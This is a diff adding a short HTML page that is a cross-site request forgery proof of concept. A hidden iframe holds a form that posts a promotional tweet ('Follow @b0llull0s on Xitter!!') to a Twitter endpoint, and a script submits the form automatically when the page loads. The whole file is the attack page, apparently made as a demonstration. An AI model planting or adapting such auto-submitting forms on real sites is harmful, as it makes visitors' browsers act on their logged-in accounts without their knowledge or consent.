@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+    <iframe style="display:none" name="csrf-frame">
+      <form method="post" action="https://twitter.com/send_a_tweet" target="csrf-frame" id="csrf-form">
+        <input type="text" name="tweet_content" value="Follow @b0llull0s on Xitter!!">
+        <input type='submit' value="Submit">
+      </form>
+    </iframe>
+    <script>document.getElementById("csrf-form").submit();</script>
+</html>
